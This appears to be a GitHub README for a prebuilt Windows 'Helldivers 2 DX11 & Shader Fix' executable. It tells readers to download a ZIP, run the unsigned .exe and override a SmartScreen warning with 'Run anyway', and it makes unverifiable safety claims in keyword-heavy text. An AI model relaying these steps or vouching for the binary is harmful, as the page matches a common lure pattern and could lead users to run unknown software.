<p align="center">
  <img src="https://i.postimg.cc/9QMZshBd/banner.png" alt="Helldivers 2 DX11 & Shader Fix — Boost FPS & Fix Crashes Without Touching GameGuard" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Helldivers%202%20DX11%20%26%20Cache-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-hd2--dx11--fix--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Helldivers 2 DX11 & Shader Fix — Boost FPS & Fix Crashes Without Touching GameGuard

**Helldivers 2 dropping below 40 FPS during bug breaches or crashing on launch after a Galactic War patch? Clearing stale AppData\Roaming\Arrowhead\Helldivers2\shader_cache and switching to DirectX 11 (--use-d3d11) delivers a massive FPS jump safely.**

Helldivers 2 DX11 & Shader Fix automates the community's safest performance fixes on Windows: **backing up `user_settings.config`, clearing corrupted `%APPDATA%\Arrowhead\Helldivers2\shader_cache` pipelines, and configuring Steam's official `--use-d3d11` launch flag without modifying any game binaries**.

This project is aimed at **Helldivers 2 on Windows 10/11 PC (Steam)**—operating strictly on `%APPDATA%\Arrowhead\Helldivers2` user configs and Steam launch arguments so nProtect GameGuard is never interfered with.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Severe FPS drops during heavy explosions and Terminid/Automaton swarms | Default DX12 backend has higher CPU draw-call overhead on mid-range CPUs | Enable Steam launch option `--use-d3d11` and rebuild clean DX11 shader cache |
| Black screen or crash on ship load right after a game patch | Old DX12/DX11 compiled blobs in `%APPDATA%\Arrowhead\Helldivers2\shader_cache` | Purge `shader_cache` so the game compiles fresh shaders on next launch |
| Graphics settings reset or won't save after crash | Corrupted `user_settings.config` in `AppData\Roaming\Arrowhead` | Back up and validate `user_settings.config` cleanly |
| Concern about nProtect GameGuard anti-cheat compatibility | Modifying game `.exe` or `.dll` files triggers anti-cheat blocks | Touch **zero** game install files—use only `AppData` cache & Steam launch flags |

## Download for Windows

[**Download Helldivers2DX11Fix.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Helldivers2DX11Fix.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `Helldivers2DX11Fix.exe`? (Key features)

- Locates `%APPDATA%\Arrowhead\Helldivers2` and measures stale `shader_cache` size immediately.
- Clears corrupted `shader_cache` files safely after game or GPU driver updates.
- Applies or removes Steam's `--use-d3d11` launch option (with `localconfig.vdf` backup) in one click.
- Creates timestamped backups of `user_settings.config` and `saves`—zero game folder modifications.

### Sample Output

```text
[Helldivers2DX11Fix] Located: C:\Users\Player\AppData\Roaming\Arrowhead\Helldivers2
[OK]   Config Backup    : user_settings.config backed up to Documents\HD2-Backups\2026-11-23\
[OK]   Shader Cache     : Cleared 412 MB stale shader_cache blobs
[OK]   Steam Launch Opt : '--use-d3d11' configured for AppID 553850 (Close Steam first)
```

The release ZIP is named `Helldivers2DX11Fix.zip`; the Windows executable inside is named `Helldivers2DX11Fix.exe`.

1. Close Helldivers 2 DX11 Fix before updating or replacing executable files.
2. Click **Download Helldivers2DX11Fix.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Helldivers2DX11Fix.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with Helldivers 2 installed on Steam.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `Helldivers2DX11Fix.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Substantial CPU-bound FPS boost via DirectX 11 (`--use-d3d11`)

Reduces draw-call CPU bottlenecks on Ryzen 5/7 and Intel Core i5/i7 systems during intense mission waves.

### Fixing post-patch black screens via `shader_cache` reset

Deletes outdated pipeline caches in `%APPDATA%\Arrowhead\Helldivers2\shader_cache` cleanly.

### 100% GameGuard-safe workflow

Never touches `Helldivers 2\bin` or anti-cheat files; uses only official user configuration directories.

### One-click rollback to default DirectX 12

Remove `--use-d3d11` anytime in one click.

## Default folders and configuration paths

Helldivers 2 stores user settings and compiled shader caches in `%APPDATA%\Arrowhead\Helldivers2`:

```text
%APPDATA%\Arrowhead\Helldivers2\
```

Typical directory layout:

```text
%APPDATA%\Arrowhead\Helldivers2\
├── shader_cache\          (Cleared safely to rebuild fresh pipelines)
├── user_settings.config   (Backed up before changes)
└── saves\
```

Close Steam completely before applying `--use-d3d11` so Steam does not overwrite `localconfig.vdf` when exiting.

## Quick start guide

Follow these steps to get started:

1. **Close Helldivers 2 and Steam completely.** Extract `Helldivers2DX11Fix.zip` and run `Helldivers2DX11Fix.exe`.
2. **Click **Back Up Config & Clear Shader Cache**.** Check **Enable DirectX 11 (`--use-d3d11`)** if you want higher CPU-bound FPS.
3. **Start Steam and launch Helldivers 2.** Wait 15–30 seconds on initial launch while fresh shaders compile.

### Data safety note

Helldivers 2 DX11 Fix never modifies files inside `steamapps\common\Helldivers 2`.

## What the status summary shows

Helldivers 2 DX11 Fix displays **`AppData` profile path, `shader_cache` MB cleared, `user_settings.config` backup status, and active DX11/DX12 launch flag**.

## FAQ

**Is using --use-d3d11 safe with Helldivers 2's anti-cheat?**

Yes—`--use-d3d11` is a built-in engine command-line flag supported by the official game executable and does not modify game files.

**Why is my screen black for 20 seconds on the first launch after clearing shader_cache?**

That is normal—the game is compiling clean new shaders for your GPU driver and will boot normally once finished.

**How do I switch back to DirectX 12?**

Close Steam, click 'Restore Default DX12' in Helldivers 2 DX11 Fix, and start Steam.

## Useful reading

- [Helldivers 2 on Steam](https://store.steampowered.com/app/553850/HELLDIVERS_2/)

## More Windows Gaming Utilities

- [ShaderCache-UnlimitedGPUUnlock](../ShaderCache-UnlimitedGPUUnlock) — Unlock NVIDIA/AMD shader cache limits & purge stale DX12 caches
- [DX12-ShaderCacheCleaner](../DX12-ShaderCacheCleaner) — GPU Shader Cache & DirectX 12 cleaner for NVIDIA & AMD
- [MiniHUD-LightweightFPSOverlay](../MiniHUD-LightweightFPSOverlay) — Compact borderless FPS, frametime & GPU temp overlay
- [NetLag-PingJitterMonitor](../NetLag-PingJitterMonitor) — Lightweight live ping, packet loss & jitter sparkline overlay

*Independent community project. Not affiliated with Arrowhead Game Studios, Sony Interactive Entertainment, Valve, or Steam.*
